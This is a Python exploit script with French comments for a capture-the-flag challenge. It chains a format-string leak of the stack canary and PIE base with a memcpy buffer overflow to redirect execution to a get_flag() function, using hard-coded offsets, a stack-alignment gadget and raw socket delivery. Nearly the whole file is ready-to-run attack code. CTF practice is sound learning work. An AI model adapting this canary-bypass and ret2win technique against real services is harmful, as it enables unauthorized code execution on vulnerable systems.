#!/usr/bin/env python3
"""
Exploit complet pour le CTF "R3t2W1n_M4st3r_2026"
Format String leak (canari + base PIE) + Buffer Overflow (memcpy) -> ret2win vers get_flag()

Testé et validé de bout en bout (sans pwntools, uniquement socket/struct).
"""
import socket
import struct
import sys
import time

# --- Offsets verifies au sol (gdb + objdump) sur le binaire fourni ---
OFF_CANARY = 17            # %17$p -> canari reel (verifie par breakpoint gdb)
OFF_RETADDR = 19           # %19$p -> adresse de retour dans main()
RET_SITE_OFFSET = 0x137e   # offset (dans le binaire) de l'instruction juste apres "call process_dns_response"
GET_FLAG_OFFSET = 0x1249   # offset de get_flag()
RET_GADGET_OFFSET = 0x130c # offset d'un simple "ret" (le ret final de process_dns_response), pour realigner la pile

# --- Disposition de pile de process_dns_response (confirmee par objdump) ---
#   buffer[64]      @ rbp-0x50
#   canari           @ rbp-0x08   -> 72 octets apres le debut du buffer
#   rbp sauvegarde   @ rbp
#   adresse retour   @ rbp+0x08
PAD_TO_CANARY = 0x48       # 72
FILLER_SAVED_RBP = 8


def leak(sock):
    # Le memcpy(buffer, response, len) a lieu a CHAQUE lecture, meme pour
    # un simple leak. Si le payload depasse 64 octets ici, on corrompt deja
    # le canari avec des donnees non controlees et le process abort()
    # (stack_chk_fail) avant meme qu'on envoie le payload final.
    # On utilise des %p SEQUENTIELS (pas %N$p direct) : sauter a un indice
    # eleve sans "declarer" les precedents desaligne la lecture glibc.
    payload = ".".join(["%p"] * OFF_RETADDR).encode() + b"\n"
    assert len(payload) <= 64, "payload de leak trop long : va corrompre le canari"
    sock.sendall(payload)
    time.sleep(0.2)
    data = sock.recv(8192)
    line = data.split(b"\n")[0].split(b": ", 1)[1]
    vals = line.split(b".")
    canary = int(vals[OFF_CANARY - 1].decode(), 16)
    retaddr = int(vals[OFF_RETADDR - 1].decode(), 16)
    return canary, retaddr


def exploit(host, port):
    s = socket.create_connection((host, port))
    s.settimeout(5)

    canary, retaddr = leak(s)
    base = retaddr - RET_SITE_OFFSET
    get_flag_addr = base + GET_FLAG_OFFSET
    ret_gadget = base + RET_GADGET_OFFSET

    print(f"[+] Canari leake       : {hex(canary)}")
    print(f"[+] Adresse de retour  : {hex(retaddr)}")
    print(f"[+] Base PIE           : {hex(base)}")
    print(f"[+] get_flag()         : {hex(get_flag_addr)}")
    print(f"[+] Gadget ret (align) : {hex(ret_gadget)}")

    # ret2win : on ecrase canari (valeur exacte) + rbp (sans importance)
    # + retour -> gadget 'ret' (realigne la pile de 8 octets, requis par
    # l'ABI System V : sinon system() segfault sur une instruction SSE
    # alignee) -> get_flag()
    payload = b"A" * PAD_TO_CANARY
    payload += struct.pack("<Q", canary)
    payload += b"B" * FILLER_SAVED_RBP
    payload += struct.pack("<Q", ret_gadget)
    payload += struct.pack("<Q", get_flag_addr)

    print(f"[+] Taille payload      : {len(payload)} octets")
    s.sendall(payload)

    out = b""
    start = time.time()
    while time.time() - start < 4:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            break

    print("---- Sortie du serveur ----")
    print(out.decode(errors="replace"))
    s.close()
    return out


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 13370
    exploit(host, port)